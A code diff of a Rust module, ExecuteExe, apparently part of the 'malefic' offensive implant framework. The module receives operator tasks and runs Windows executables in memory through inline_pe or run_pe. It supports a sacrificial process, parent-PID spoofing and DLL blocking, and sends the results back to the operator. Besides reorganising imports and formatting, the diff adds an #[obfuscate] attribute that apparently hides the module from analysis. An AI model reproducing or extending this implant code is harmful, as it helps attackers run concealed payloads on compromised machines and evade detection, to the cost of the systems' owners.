@@ -1,12 +1,12 @@
 #![allow(unused_assignments)]
 use std::ptr::null;
 
-use malefic_helper::win::kit::pe::{inlinepe::inline_pe, runpe::run_pe};
-use malefic_helper::common::utils::format_cmdline;
-use malefic_proto::module::{Module, ModuleResult, TaskResult};
-use malefic_proto::proto::modulepb::BinaryResponse;
 use crate::execute::Arch;
 use crate::prelude::*;
+use malefic_common::utils::format_cmdline;
+use malefic_module::{Module, ModuleResult, TaskResult};
+use malefic_os_win::kit::pe::{inlinepe::inline_pe, runpe::run_pe};
+use malefic_proto::proto::modulepb::BinaryResponse;
 
 pub struct ExecuteExe {}
 
@@ -15,9 +15,15 @@ pub struct ExecuteExe {}
 impl Module for ExecuteExe {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for ExecuteExe {
+#[obfuscate]
+impl malefic_module::ModuleImpl for ExecuteExe {
     #[allow(unused_variables)]
-    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, sender: &mut malefic_proto::module::Output) -> ModuleResult {
+    async fn run(
+        &mut self,
+        id: u32,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
+    ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let is_x86 = matches!(Arch::from_u32(request.arch), Some(Arch::I686));
         let entrypoint = request.entry_point;
@@ -44,7 +50,8 @@ impl malefic_proto::module::ModuleImpl for ExecuteExe {
                     is_x86,
                     sacrifice.ppid,
                     sacrifice.block_dll,
-                    request.output);
+                    request.output,
+                );
             }
         } else {
             let par = if request.args.is_empty() {
@@ -67,17 +74,19 @@ impl malefic_proto::module::ModuleImpl for ExecuteExe {
                     request.output,
                     // 1000
                     request.timeout,
-                    request.delay
+                    request.delay,
                 );
             }
         }
 
-        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
-            status: 0,
-            message: Vec::new(),
-            data: result,
-            err: "".to_string(),
-        }))
-        )
+        Ok(TaskResult::new_with_body(
+            id,
+            Body::BinaryResponse(BinaryResponse {
+                status: 0,
+                message: Vec::new(),
+                data: result,
+                err: "".to_string(),
+            }),
+        ))
     }
 }
